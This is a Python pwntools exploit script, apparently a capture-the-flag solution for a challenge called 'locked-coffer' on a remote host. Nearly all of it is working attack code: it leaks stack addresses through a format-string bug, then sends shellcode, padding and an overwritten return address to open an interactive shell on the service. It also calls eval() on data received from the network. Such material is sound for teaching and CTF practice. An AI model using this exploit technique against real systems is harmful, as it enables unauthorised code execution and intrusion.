#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template locked-coffer
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('locked-coffer')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      PIE enabled
# RWX:      Has RWX segments

io = remote("lockedcoffer.tghack.no", 1337)

PAYLOAD = "%p "*24 # Format string vulnerability
io.sendlineafter(">", PAYLOAD)

# Filter the leaked addresses. Playing with GDB reveals which addresses are stack addresses etc.
# In GDB: `info reg` -> $rsp
leaks = io.recvuntil("\n").strip().decode().split(" ")
leak = eval(leaks[18])
log.info(f"Stack is at: {hex(leak)}")

# Generate shellcode, padding and calculate the correct return address.
SHELLCODE = asm(shellcraft.sh())
PADDING = b"A" * (cyclic_find(b'raaaaaaa', n=8) - len(SHELLCODE))
RIP = p64(leak - 0xA0) # Return address points to the exact location in the stack where the shellcode is stored.
# Note: It is also possible to use a NOP-sled and point to somewhere within the memory range where the NOP-sled
# resides, instead of having calculated the exact offset like done in this solution.

# Send our generated payload
PAYLOAD  = SHELLCODE + PADDING + RIP
io.sendlineafter(">", PAYLOAD)

# Congratulations, you got a shell!
io.interactive()

